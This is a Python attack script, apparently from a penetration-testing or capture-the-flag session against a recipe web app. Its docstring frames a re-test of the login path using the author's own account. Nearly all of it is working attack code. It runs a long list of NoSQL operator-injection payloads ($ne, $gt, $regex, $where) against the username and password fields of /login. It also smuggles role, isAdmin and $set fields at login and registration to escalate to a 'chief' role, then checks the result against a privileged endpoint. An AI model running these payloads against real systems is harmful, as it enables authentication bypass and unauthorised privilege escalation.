#!/usr/bin/env python3
"""Re-run the auth layer from scratch, with my OWN account as the positive control.

Workflow error this session: I inherited "auth-layer NoSQL is dead" and "session-role
smuggling at login disproved" from the previous run's summary and went straight to exotic
chains. But `nosql.py` only ever put operator objects in the **username** field, and the
register endpoint rejects them with a charset error (400) - which says nothing about what
`/login` does with an object in **password**, or with an object in username *plus* a real
password. Nobody in either session tested the mechanism against a account of ours, which is
the only clean way to learn whether operators reach the query at all: if the bypass exists,
it works on `me` first, before it means anything about anyone else.

`/login` answers `{ok, user, role}`, so every attempt tells me exactly whose document it
matched and what role the server believes that user has - a self-revealing oracle. Phase 1
stays entirely on accounts I created. Phase 2 is only reached if phase 1 proves the
vulnerability exists; if it does not, the login path is closed and I stop claiming otherwise.
"""
import sys
import time

from cc import Client, new_baker


def w(*a):
    sys.stdout.buffer.write((" ".join(str(x) for x in a) + "\n").encode("utf-8", "replace"))
    sys.stdout.flush()


u, c, _ = new_baker("au")
if not c:
    w("register failed")
    sys.exit(1)
PW = "Passw0rd!"
w("own account: %s / %s" % (u, PW))


def try_login(label, body, ctype="json"):
    x = Client()
    if ctype == "json":
        code, out, dt = x.post("/login", body)
    elif ctype == "form":
        raw = "&".join("%s=%s" % (k, v) for k, v in body.items())
        code, out, dt = x.req("POST", "/login", raw.encode() if isinstance(raw, bytes) else raw,
                              headers={"Content-Type": "application/x-www-form-urlencoded"})
    else:
        code, out, dt = x.req("POST", "/login", body, headers={"Content-Type": "text/plain"})
    who = out.get("user") if isinstance(out, dict) else None
    role = out.get("role") if isinstance(out, dict) else None
    w("  %-34s -> %-3s user=%-12s role=%-10s %s" % (label, code, who, role,
       str(out)[:56] if code != 200 else ""))
    return x, code, out


w("=== 0. controls ===")
try_login("correct password", {"username": u, "password": PW})
try_login("wrong password", {"username": u, "password": "nope"})
try_login("absent username", {"username": "zz_absent_zz", "password": PW})

w("=== 1. operator objects in PASSWORD (never tested) ===")
for label, val in [("password $ne", {"$ne": "zz"}), ("password $gt empty", {"$gt": ""}),
                   ("password $gte empty", {"$gte": ""}), ("password $in list", {"$in": [PW, "x"]}),
                   ("password $regex any", {"$regex": "."}), ("password $eq real", {"$eq": PW}),
                   ("password $exists", {"$exists": True}), ("password $not", {"$not": {"$eq": "zz"}}),
                   ("password $where", {"$where": "1==1"}), ("password empty object", {}),
                   ("password empty array", []), ("password list with real", [PW]),
                   ("password null", None), ("password true", True), ("password 0", 0),
                   ("password number string", "0e0")]:
    try_login(label, {"username": u, "password": val})

w("=== 2. operator objects in USERNAME ===")
for label, val in [("username $ne", {"$ne": "zz_no_such"}), ("username $regex any", {"$regex": "."}),
                   ("username $regex of mine", {"$regex": "^" + u}), ("username $in", {"$in": [u]}),
                   ("username $exists", {"$exists": True}),
                   ("username $where role", {"$where": "this.role!='baker'"}),
                   ("both operators", {"$ne": "zz"})]:
    pw = val if label == "both operators" else PW
    try_login(label, {"username": val, "password": pw})
    try_login(label + " + wrong pw", {"username": val, "password": "nope"})

w("=== 3. content-type / transport variants ===")
try_login("form-urlencoded", {"username": u, "password": PW}, ctype="form")
try_login("text/plain body", {"username": u, "password": PW}, ctype="text")

w("=== 4. extra fields at LOGIN: can a login write the user document? ===")
EXTRA = ["role", "roles", "level", "tier", "type", "usertype", "isAdmin", "is_admin", "admin",
         "staff", "authority", "clearance", "group", "$set", "set", "role_"]
for f in EXTRA:
    val = {"role": "chief", "$set": {"role": "chief"}, "set": {"role": "chief"}}.get(f, "chief")
    body = {"username": u, "password": PW}
    body[f] = val
    x, code, out = try_login("login +%s=%s" % (f, str(val)[:22]), body)
    if code == 200 and out.get("role") != "baker":
        w("    !!! login answered role=%r" % out.get("role"))
    # the durable test: fresh login + can this session seal?
    y = Client()
    y.post("/login", {"username": u, "password": PW})
    code2, out2, dt = y.post("/api/recipe", {"title": "after login injection",
                                             "ingredients": [{"name": "f", "value": "1"}]})
    rid = out2.get("id") if isinstance(out2, dict) else None
    code3, out3, dt = y.post("/api/seal", {"recipeId": rid} if rid else {})
    if code3 != 403:
        w("    !!! /api/seal after that login -> %s %s" % (code3, str(out3)[:90]))
    time.sleep(0.3)

w("=== 5. same extra fields at REGISTER, then check the prize ===")
for i, f in enumerate(EXTRA[:12]):
    nu = "au2%d%s" % (i, str(int(time.time()))[-4:])
    y = Client()
    body = {"username": nu, "password": PW}
    body[f] = "chief" if f not in ("$set", "set") else {"role": "chief"}
    code, out, dt = y.post("/register", body)
    role = out.get("role") if isinstance(out, dict) else None
    if code == 200 and role != "baker":
        w("    !!! register %s role=%r" % (nu, role))
    code2, out2, dt = y.post("/api/seal", {"recipeId": "0" * 24})
    if code2 != 403:
        w("    !!! %s /api/seal -> %s %s" % (nu, code2, str(out2)[:80]))
    time.sleep(1.2)
w("no phase-2 staff attempt will be made unless a bypass demonstrably works on our own rows")
